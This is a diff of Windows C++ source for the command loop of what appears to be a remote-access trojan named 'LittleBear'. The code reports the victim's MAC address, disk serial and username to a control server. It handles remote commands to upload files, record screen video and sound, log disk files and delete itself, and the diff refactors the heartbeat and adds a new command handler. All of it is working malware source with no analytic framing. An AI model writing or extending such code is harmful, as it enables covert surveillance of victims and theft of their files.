@@ -105,31 +105,20 @@ DWORD  WINAPI NetWorkCommand(VOID)
 			return FALSE;
 		}
 
+
+		iRet = SendCmdPacket(hSock, HEARTBEAT, 0);
+		if (iRet <= 0)
+		{
+			lpclosesocket(hSock);
+			writeLog("send heartbeat packet error:%u\r\n", GetLastError());
+			return FALSE;
+		}
+
 		char* lpBuf = new char[NETWORK_DATABUF_SIZE];
 		if (lpBuf == 0)
 		{
 			lpclosesocket(hSock);
-
 			writeLog("LittleBearWorkMain new operator recv buffer error code:%u\r\n", lpRtlGetLastWin32Error());
-			return FALSE;
-		}
-
-		LPNETWORKPACKETHEADER firsthdr = (LPNETWORKPACKETHEADER)lpBuf;
-		firsthdr->cmd = HEARTBEAT;
-		memmove(firsthdr->unique.cMAC, cMAC, MAC_ADDRESS_LENGTH);
-		firsthdr->unique.dwVolumeNO = ulVolumeSerialNo;
-		firsthdr->unique.compress = DATANONECOMPRESS;
-		firsthdr->unique.crypt = DATANONECRYPT;
-		memset(firsthdr->unique.username, 0, USERNAME_LIMIT_SIZE);
-		lstrcpyA((char*)firsthdr->unique.username, (char*)gUserName);
-		firsthdr->packlen = 0;
-		iRet = lpsend(hSock, lpBuf, sizeof(NETWORKPACKETHEADER), 0);
-		if (iRet <= 0)
-		{
-			delete[]lpBuf;
-			lpclosesocket(hSock);
-
-			writeLog("send heartbeat packet error:%u\r\n", GetLastError());
 			return FALSE;
 		}
 
@@ -157,6 +146,13 @@ DWORD  WINAPI NetWorkCommand(VOID)
 				writeLog("recv packet size:%u error\r\n", dwDataSize);
 				break;
 			}
+
+			//iRet = SendCmdPacket(hSock, HEARTBEAT, 0);
+			//if (iRet <= 0)
+			//{
+			//	writeLog("send heartbeat packet error:%u\r\n", GetLastError());
+			//	break;
+			//}
 
 			if (dwDataSize != dwRecvSize - sizeof(NETWORKPACKETHEADER))
 			{
@@ -200,21 +196,11 @@ DWORD  WINAPI NetWorkCommand(VOID)
 
 			if (dwCommand == HEARTBEAT)
 			{
-				LPNETWORKPACKETHEADER hdr = (LPNETWORKPACKETHEADER)lpBuf;
-				hdr->cmd = HEARTBEAT;
-				memmove(hdr->unique.cMAC, cMAC, MAC_ADDRESS_LENGTH);
-				hdr->unique.dwVolumeNO = ulVolumeSerialNo;
-				hdr->unique.compress = DATANONECOMPRESS;
-				hdr->unique.crypt = DATANONECRYPT;
-				memset(hdr->unique.username, 0, 16);
-				lstrcpyA((char*)hdr->unique.username, (char*)gUserName);
-				hdr->packlen = 0;
-				iRet = lpsend(hSock, lpBuf, sizeof(NETWORKPACKETHEADER), 0);
-				if (iRet <= 0)
-				{
-					writeLog("send heartbeat packet error:%u\r\n", GetLastError());
-					break;
-				}
+
+			}
+			else if (dwCommand == DAILY_WORK_ITEM) {
+				DWORD cmd = *(DWORD*)(lpBuf + sizeof(NETWORKPACKETHEADER));
+				lpCloseHandle(lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)NetworkData, (LPVOID)cmd, 0, 0));
 			}
 			else if (dwCommand == UPLOADFILE)
 			{
@@ -321,7 +307,6 @@ DWORD  WINAPI NetWorkCommand(VOID)
 					}
 					HANDLE hThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetScreenVideo, (LPVOID)ulTimeDelay, 0, 0);
 					lpCloseHandle(hThread);
-
 				}
 			}
 			else if (dwCommand == SOUNDRECORD)
@@ -412,6 +397,7 @@ DWORD  WINAPI NetWorkCommand(VOID)
 				writeLog("recv SUICIDE command\r\n");
 				HANDLE hThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)SuicideSelf, 0, 0, 0);
 				lpCloseHandle(hThread);
+				break;
 			}
 			else if (dwCommand == DISKFILERECORD)
 			{
